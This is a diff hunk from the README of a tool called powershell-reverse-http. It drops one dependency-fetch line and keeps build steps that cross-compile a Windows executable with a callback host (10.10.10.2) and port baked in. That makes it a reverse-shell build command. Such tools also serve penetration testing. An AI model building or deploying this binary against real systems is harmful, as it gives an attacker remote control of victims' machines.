@@ -12,7 +12,6 @@ First, you need [go](https://golang.org/dl/) for build the binary (duh!) and [me
 ```
 git clone https://github.com/mauri870/powershell-reverse-http.git
 cd powershell-reverse-http
-go get golang.org/x/sys/windows
 env GOOS=windows go build -ldflags "-X main.LHOST=10.10.10.2 -X main.LPORT=3000" -o powershell-reverse.exe
 ```
 
